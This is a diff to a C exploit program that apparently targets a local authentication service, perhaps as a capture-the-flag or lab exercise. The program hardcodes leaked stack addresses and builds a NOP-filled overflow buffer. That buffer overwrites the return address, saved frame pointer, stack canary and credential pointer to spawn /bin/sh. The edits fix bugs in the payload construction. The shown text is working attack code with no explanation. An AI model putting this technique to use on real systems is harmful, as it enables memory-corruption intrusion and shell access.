@@ -12,7 +12,7 @@ int main() {
     uint64_t auth_cred =   0x7ffca4e76d10; // value of cred (after alloca)
     uint64_t main_bp =       0x7ffca4e77550; // saved rbp value in mainloop
     uint64_t main_loop_return_addr = 0x5613287a3ea9; // return address on the stack inside main loop
-    uint64_t private_helper_addr = 0x5613287a3fa6;
+    uint64_t private_helper_addr = 0x5613287a3fa6; // TODO
 
     uint64_t auth_bp_cred_loc_dist = auth_cred_loc - auth_bp;
     uint64_t auth_bp_cred_dist = auth_cred - auth_bp;
@@ -59,20 +59,20 @@ int main() {
             cur_auth_bp, cur_auth_cred_loc, curr_auth_cred, curr_private_helper_addr);
 
     // Now, send the payload
-    put_str("p /bin/sh\0\n");
+    put_str("p /bin/sh\n\0");
     send();
     get_formatted("%*s");
 
     unsigned explsz = auth_db_cred_dist + 8 - 8 + (4*8);
     void* *expl = (void**)malloc(explsz);
-    memset((void*)expl, '90', explsz);
+    memset((void*)expl, 0x90, explsz);
 
-    expl[explsz/sizeof(void*)-1] = (void*)curr_auth_cred + 9; // return address
+    expl[explsz/sizeof(void*)-1] = (void*)curr_auth_cred + 10; // return address
     expl[explsz/sizeof(void*)-2] = (void*)cur_auth_bp; // saved rbp value
     expl[explsz/sizeof(void*)-3] = (void*)stack_canary; // canary
     expl[explsz/sizeof(void*)-4] = (void*)curr_auth_cred; // cred
     expl[explsz/sizeof(void*)-5] = (void*)cur_auth_cred_loc; // db
-    expl[1] = 0xdeadbeef;
+    expl[1] = (void*)0xdeadbeef;
 
     put_str("u ");
     put_bin((char*)expl, explsz);
